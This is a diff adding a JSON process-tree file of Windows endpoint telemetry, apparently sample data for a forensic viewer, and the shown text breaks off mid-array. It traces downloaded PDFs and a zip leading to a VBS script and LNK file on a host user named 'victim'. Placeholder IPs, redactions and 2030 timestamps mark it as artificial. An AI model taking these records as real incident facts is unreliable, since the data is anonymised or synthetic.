@@ -1,0 +1,573 @@
+{
+    "name": "Independant process trees",
+    "id": 0,
+    "details": "",
+    "context": [],
+    "children": [{
+        "name": "Process Tree N°1:",
+        "id": 2,
+        "details": "",
+        "context": [],
+        "children": [{
+            "name": "winlogon.exe",
+            "id": "85212",
+            "details": "Process (ID:85212) (since 0 during undetermined period)   <span style=\"color:#fd8d3c\">Unknown process executed</span>:<br/>Command line: unknown<br/>Executable path: winlogon.exe<br/>AuthenticationID: 999 (System)<br/>",
+            "context": [],
+            "children": [{
+                    "name": "LogonUI.exe",
+                    "id": "648847",
+                    "details": "Process (ID:648847) (since 2030-01-25 09:11:15.529000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"LogonUI.exe\" /flags:0x4<br/>Executable path: C:\\Windows\\System32\\LogonUI.exe<br/>Hash (MD5): b3cc2464bece9a99d8c755a7ccbfef52<br/>Hash (SHA256): b62e62c7374ce1398b985af3122ff10a092750f65191fdc3aa6151de130183a3<br/>AuthenticationID: 999 (System), SID: S-1-5-18 (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                    "context": [
+                        "Context (at 2030-01-25 09:11:21.057000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): b62e62c7374ce1398b985af3122ff10a092750f65191fdc3aa6151de130183a3<br/>"
+                    ],
+                    "children": []
+                },
+                {
+                    "name": "LogonUI.exe",
+                    "id": "97495",
+                    "details": "Process (ID:97495) (since 2030-01-25 09:10:51.503000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"LogonUI.exe\" /flags:0x0<br/>Executable path: C:\\Windows\\System32\\LogonUI.exe<br/>Hash (MD5): b3cc2464bece9a99d8c755a7ccbfef52<br/>Hash (SHA256): b62e62c7374ce1398b985af3122ff10a092750f65191fdc3aa6151de130183a3<br/>AuthenticationID: 999 (System), SID: S-1-5-18 (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                    "context": [
+                        "Context (at 2030-01-25 09:11:00.487000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): b62e62c7374ce1398b985af3122ff10a092750f65191fdc3aa6151de130183a3<br/>",
+                        "Context (at 2030-01-25 09:11:00.340000)   <span style=\"color:#fd8d3c\">ServiceStarted</span>:<br/>Service name: 'WbioSrvc', Image file name: C:\\Windows\\System32\\svchost.exe<br/>"
+                    ],
+                    "children": []
+                },
+                {
+                    "name": "wlrmdr.exe",
+                    "id": "61065",
+                    "details": "Process (ID:61065) (since 2030-01-25 08:05:24.841000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line:  -c -s 0 -f 0 -t Empty -m Empty -a 0 -u Empty<br/>Executable path: C:\\Windows\\System32\\wlrmdr.exe<br/>Hash (MD5): 624184528091daa448d0fd412fd7e178<br/>Hash (SHA256): ccca8b15b974977c0fe467df44df99451900521173ae602d8c144172fed67187<br/>AuthenticationID: REDACTED, SID: REDACTED (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Impersonation Token'<br/>",
+                    "context": [
+                        "Context (at 2030-01-25 08:05:24.879000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): ccca8b15b974977c0fe467df44df99451900521173ae602d8c144172fed67187<br/>"
+                    ],
+                    "children": []
+                },
+                {
+                    "name": "userinit.exe",
+                    "id": "98952741538",
+                    "details": "Process (ID:98952741538) (since 2030-01-25 08:04:45.029000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: C:\\Windows\\system32\\userinit.exe<br/>Executable path: C:\\Windows\\System32\\userinit.exe<br/>Hash (MD5): fc003295bccc472cf80de65788f64978<br/>Hash (SHA256): f098ce116049a2024fa282fd62764159f451a9c1cc21a7845d155d439cf52b27<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Impersonation Token'<br/>",
+                    "context": [
+                        "Context (at 2030-01-25 08:04:41.733000)   <span style=\"color:#fd8d3c\">UserLogon</span>:<br/>ContextUsername: victim (Logon domain: victim-PC), Logon flags: 'User is local and admin', AuthenticationID: 385177, Authentication Package: NTLM, SID: REDACTED-SID (read more: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers)<br/>Is local admin: 1, Password Last Set: 2023-09-13 14:17:28.651000<br/><br/>",
+                        "Context (at 2030-01-25 08:05:08.224000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): f098ce116049a2024fa282fd62764159f451a9c1cc21a7845d155d439cf52b27<br/>"
+                    ],
+                    "children": [{
+                        "name": "explorer.exe",
+                        "id": "12617",
+                        "details": "Process (ID:12617) (since 2030-01-25 08:04:45.095000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: C:\\Windows\\Explorer.EXE<br/>Executable path: C:\\Windows\\explorer.exe<br/>Hash (MD5): 07be62a5ec0e923f7f642ff7c1aed7b7<br/>Hash (SHA256): 1510d045acbb5991bddfc93ad83eb34eae623e907746549e58e6455325164b1d<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                        "context": [
+                            "Context (at 2030-01-25 09:11:17.051000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 1510d045acbb5991bddfc93ad83eb34eae623e907746549e58e6455325164b1d<br/>",
+                            "Context (at 2030-01-25 08:51:56.939000)   <span style=\"color:#fd8d3c\">NewExecutableWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Recent\\\\Report-86.lnk<br/>Status: 'Success'<br/>",
+                            "Context (at 2030-01-25 08:51:45.383000)   <span style=\"color:#fd8d3c\">NewScriptWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\Downloads\\\\i\\\\Report-86.vbs<br/>Status: 'Success'<br/>",
+                            "Context (at 2030-01-25 08:51:45.324000)   <span style=\"color:#fd8d3c\">DirectoryCreate</span>:<br/>File name: C:\\\\Users\\\\victim\\\\Downloads\\\\i<br/>",
+                            "Context (at 2030-01-25 08:51:35.661000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: ocws.officeapps.live.com<br/>Request type: 'AAAA'<br/>Resolved IPv4 addresses: 52.109.68.87;<br/>CNAME Records: prod.ocws1.live.com.akadns.net;europe.ocws1.live.com.akadns.net;<br/>Query status: OK<br/>",
+                            "Context (at 2030-01-25 08:51:35.661000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:51461 -> 52.52.52.52:443 (Protocol:TCP)<br/>"
+                        ],
+                        "children": [{
+                                "name": "msedge.exe",
+                                "id": "50306",
+                                "details": "Process (ID:50306) (since 2030-01-25 08:04:58.360000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window --win-session-start /prefetch:5<br/>Executable path: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe<br/>Hash (MD5): d193ea4b8d102d020c02dc45af23ff0d<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                "context": [
+                                    "Context (at 2030-01-25 09:11:15.892000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>",
+                                    "Context (at 2030-01-25 08:04:58.986000)   <span style=\"color:#fd8d3c\">DirectoryCreate</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\OptimizationGuidePredictionModels<br/>",
+                                    "Context (at 2030-01-25 08:04:59.002000)   <span style=\"color:#fd8d3c\">DirectoryCreate</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\EdgePushStorageWithConnectTokens<br/>"
+                                ],
+                                "children": [{
+                                        "name": "msedge.exe",
+                                        "id": "426643",
+                                        "details": "Process (ID:426643) (since 2030-01-25 09:02:35.804000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=renderer --disable-nacl --lang=fr --js-flags=--ms-user-locale=fr_FR --device-scale-factor=1.25 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=47 --time-ticks-at-unix-epoch=-1697007861990991 --launch-time-ticks=3493768176 --mojo-platform-channel-handle=5852 --field-trial-handle=1976,i,7627800415354467257,9031044406060920106,262144 /prefetch:1<br/>Executable path: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe<br/>Hash (MD5): d193ea4b8d102d020c02dc45af23ff0d<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 09:11:15.851000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "msedge.exe",
+                                        "id": "94287",
+                                        "details": "Process (ID:94287) (since 2030-01-25 09:02:26.423000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=renderer --instant-process --disable-nacl --lang=fr --js-flags=--ms-user-locale=fr_FR --device-scale-factor=1.25 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=46 --time-ticks-at-unix-epoch=-1697007861990991 --launch-time-ticks=3484403110 --mojo-platform-channel-handle=6856 --field-trial-handle=1976,i,7627800415354467257,9031044406060920106,262144 /prefetch:1<br/>Executable path: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe<br/>Hash (MD5): d193ea4b8d102d020c02dc45af23ff0d<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 09:11:15.940000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "msedge.exe",
+                                        "id": "74588",
+                                        "details": "Process (ID:74588) (since 2030-01-25 08:17:54.633000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=renderer --disable-nacl --lang=fr --js-flags=--ms-user-locale=fr_FR --device-scale-factor=1.25 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=44 --time-ticks-at-unix-epoch=-1697007861990991 --launch-time-ticks=812622652 --mojo-platform-channel-handle=5892 --field-trial-handle=1976,i,7627800415354467257,9031044406060920106,262144 /prefetch:1<br/>Executable path: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe<br/>Hash (MD5): d193ea4b8d102d020c02dc45af23ff0d<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 09:11:15.851000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "msedge.exe",
+                                        "id": "74587",
+                                        "details": "Process (ID:74587) (since 2030-01-25 08:17:54.633000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=renderer --disable-nacl --lang=fr --js-flags=--ms-user-locale=fr_FR --device-scale-factor=1.25 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=44 --time-ticks-at-unix-epoch=-1697007861990991 --launch-time-ticks=812622652 --mojo-platform-channel-handle=5892 --field-trial-handle=1976,i,7627800415354467257,9031044406060920106,262144 /prefetch:1<br/>Executable path: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe<br/>Hash (MD5): d193ea4b8d102d020c02dc45af23ff0d<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 09:11:15.851000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "msedge.exe",
+                                        "id": "74586",
+                                        "details": "Process (ID:74586) (since 2030-01-25 08:17:54.633000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=renderer --disable-nacl --lang=fr --js-flags=--ms-user-locale=fr_FR --device-scale-factor=1.25 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=44 --time-ticks-at-unix-epoch=-1697007861990991 --launch-time-ticks=812622652 --mojo-platform-channel-handle=5892 --field-trial-handle=1976,i,7627800415354467257,9031044406060920106,262144 /prefetch:1<br/>Executable path: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe<br/>Hash (MD5): d193ea4b8d102d020c02dc45af23ff0d<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 09:11:15.851000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "msedge.exe",
+                                        "id": "74585",
+                                        "details": "Process (ID:74585) (since 2030-01-25 08:17:54.633000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=renderer --disable-nacl --lang=fr --js-flags=--ms-user-locale=fr_FR --device-scale-factor=1.25 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=44 --time-ticks-at-unix-epoch=-1697007861990991 --launch-time-ticks=812622652 --mojo-platform-channel-handle=5892 --field-trial-handle=1976,i,7627800415354467257,9031044406060920106,262144 /prefetch:1<br/>Executable path: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe<br/>Hash (MD5): d193ea4b8d102d020c02dc45af23ff0d<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 09:11:15.851000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "msedge.exe",
+                                        "id": "74584",
+                                        "details": "Process (ID:74584) (since 2030-01-25 08:17:54.633000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=renderer --disable-nacl --lang=fr --js-flags=--ms-user-locale=fr_FR --device-scale-factor=1.25 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=44 --time-ticks-at-unix-epoch=-1697007861990991 --launch-time-ticks=812622652 --mojo-platform-channel-handle=5892 --field-trial-handle=1976,i,7627800415354467257,9031044406060920106,262144 /prefetch:1<br/>Executable path: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe<br/>Hash (MD5): d193ea4b8d102d020c02dc45af23ff0d<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 09:11:15.851000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "msedge.exe",
+                                        "id": "74583",
+                                        "details": "Process (ID:74583) (since 2030-01-25 08:17:54.633000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=renderer --disable-nacl --lang=fr --js-flags=--ms-user-locale=fr_FR --device-scale-factor=1.25 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=44 --time-ticks-at-unix-epoch=-1697007861990991 --launch-time-ticks=812622652 --mojo-platform-channel-handle=5892 --field-trial-handle=1976,i,7627800415354467257,9031044406060920106,262144 /prefetch:1<br/>Executable path: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe<br/>Hash (MD5): d193ea4b8d102d020c02dc45af23ff0d<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 09:11:15.851000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "msedge.exe",
+                                        "id": "74582",
+                                        "details": "Process (ID:74582) (since 2030-01-25 08:17:54.633000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=renderer --disable-nacl --lang=fr --js-flags=--ms-user-locale=fr_FR --device-scale-factor=1.25 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=44 --time-ticks-at-unix-epoch=-1697007861990991 --launch-time-ticks=812622652 --mojo-platform-channel-handle=5892 --field-trial-handle=1976,i,7627800415354467257,9031044406060920106,262144 /prefetch:1<br/>Executable path: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe<br/>Hash (MD5): d193ea4b8d102d020c02dc45af23ff0d<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 09:11:15.851000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "msedge.exe",
+                                        "id": "74581",
+                                        "details": "Process (ID:74581) (since 2030-01-25 08:17:54.633000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=renderer --disable-nacl --lang=fr --js-flags=--ms-user-locale=fr_FR --device-scale-factor=1.25 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=44 --time-ticks-at-unix-epoch=-1697007861990991 --launch-time-ticks=812622652 --mojo-platform-channel-handle=5892 --field-trial-handle=1976,i,7627800415354467257,9031044406060920106,262144 /prefetch:1<br/>Executable path: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe<br/>Hash (MD5): d193ea4b8d102d020c02dc45af23ff0d<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 09:11:15.851000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>"
+                                        ],
+                                        "children": []
+                                    },
+                                    {
+                                        "name": "msedge.exe",
+                                        "id": "70373",
+                                        "details": "Process (ID:70373) (since 2030-01-25 08:04:58.950000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=fr --service-sandbox-type=none --mojo-platform-channel-handle=2136 --field-trial-handle=1976,i,7627800415354467257,9031044406060920106,262144 /prefetch:3<br/>Executable path: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe<br/>Hash (MD5): d193ea4b8d102d020c02dc45af23ff0d<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                        "context": [
+                                            "Context (at 2030-01-25 09:11:15.966000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 9ba39dd15eff718ff357db346d0fda3a12c9dbb216511cbb41050fb0d6b3d9c9<br/>",
+                                            "Context (at 2030-01-25 09:05:10.147000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: edge.microsoft.com<br/>Request type: 'AAAA'<br/>Query status: 1460<br/>",
+                                            "Context (at 2030-01-25 09:03:52.194000)   <span style=\"color:#fd8d3c\">DnsRequest</span>:<br/>Requested: browser.pipe.aria.microsoft.com<br/>Request type: 'AAAA'<br/>Query status: 1460<br/>",
+                                            "Context (at 2030-01-25 09:02:39.063000)   <span style=\"color:#fd8d3c\">NetworkConnectIP4</span>:<br/>10.10.10.10:51959 -> 20.20.20.20:443 (Protocol:TCP)<br/>"
+                                        ],
+                                        "children": []
+                                    }
+                                ]
+                            },
+                            {
+                                "name": "chrome.exe",
+                                "id": "761837",
+                                "details": "Process (ID:761837) (since 2030-01-25 08:05:04.902000 during undetermined period)   <span style=\"color:#fd8d3c\">Process executed</span>:<br/>Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" <br/>Executable path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe<br/>Hash (MD5): 7e832da622e71d4cdf1d1da89fb52d57<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>AuthenticationID: REDACTED, SID: REDACTED-SID (read more: <a href='https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers'>here</a>), Token type: 'Primary Token'<br/>",
+                                "context": [
+                                    "Context (at 2030-01-25 09:11:15.892000)   <span style=\"color:#fd8d3c\">EndOfProcess</span>:<br/>Process terminated<br/>Hash (SHA256): 8a159ba324233ea3d9e06b837188e9755d25a63ca6ccf98b7ecc8884604eca04<br/>",
+                                    "Context (at 2030-01-25 09:11:01.885000)   <span style=\"color:#fd8d3c\">NetworkReceiveAcceptIP6</span>:<br/>ff02:0:0:0:0:0:0:fb:5353 -> fe80:0:0:0:12bf:67ff:fe1c:ab57:5353 (Protocol:UDP)<br/>",
+                                    "Context (at 2030-01-25 09:07:58.791000)   <span style=\"color:#fd8d3c\">NetworkReceiveAcceptIP6</span>:<br/>ff02:0:0:0:0:0:0:fb:5353 -> fe80:0:0:0:1cc5:bad2:d114:5cae:5353 (Protocol:UDP)<br/>",
+                                    "Context (at 2030-01-25 08:47:23.635000)   <span style=\"color:#fd8d3c\">ZipFileWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\Downloads\\\\i.zip<br/>File size: 8132 bytes,Is on removable disk: 0,Is on network: 0<br/>",
+                                    "Context (at 2030-01-25 08:47:09.998000)   <span style=\"color:#fd8d3c\">PdfFileWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Temp\\\\15a6beaa-89ea-4e29-b5b4-b2cc8022ac19.tmp<br/>File size: 9867 bytes,Is on removable disk: 0,Is on network: 0<br/>",
+                                    "Context (at 2030-01-25 08:47:09.859000)   <span style=\"color:#fd8d3c\">PdfFileWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\Downloads\\\\s.pdf<br/>File size: 9867 bytes,Is on removable disk: 0,Is on network: 0<br/>",
+                                    "Context (at 2030-01-25 08:38:47.466000)   <span style=\"color:#fd8d3c\">PdfFileWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\Downloads\\\\AC_DEF_EXAPRINT_Commande_10592170.pdf<br/>File size: 75546 bytes,Is on removable disk: 0,Is on network: 0<br/>",
+                                    "Context (at 2030-01-25 08:38:47.753000)   <span style=\"color:#fd8d3c\">PdfFileWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Temp\\\\0390baaa-6c6a-4a60-9b2c-7823b34d20bd.tmp<br/>File size: 75546 bytes,Is on removable disk: 0,Is on network: 0<br/>",
+                                    "Context (at 2030-01-25 08:37:20.708000)   <span style=\"color:#fd8d3c\">PdfFileWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Temp\\\\b622b44f-9b4f-4f45-851d-c37d3f51129e.tmp<br/>File size: 100174 bytes,Is on removable disk: 0,Is on network: 0<br/>",
+                                    "Context (at 2030-01-25 08:37:20.415000)   <span style=\"color:#fd8d3c\">PdfFileWritten</span>:<br/>File name: C:\\\\Users\\\\victim\\\\Downloads\\\\DEF_EXAPRINT_Commande_10592170.pdf<br/>File size: 100174 bytes,Is on removable disk: 0,Is on network: 0<br/>",
+                                    "Context (at 2030-01-25 08:37:20.083000)   <span style=\"color:#fd8d3c\">NetworkReceiveAcceptIP4</span>:<br/>224.0.0.251:5353 -> 192.168.1.164:5353 (Protocol:UDP)<br/>",
+                                    "Context (at 2030-01-25 08:37:20.083000)   <span style=\"color:#fd8d3c\">NetworkReceiveAcceptIP6</span>:<br/>ff02:0:0:0:0:0:0:fb:5353 -> fe80:0:0:0:83c:7bc4:577:fa0a:5353 (Protocol:UDP)<br/>",
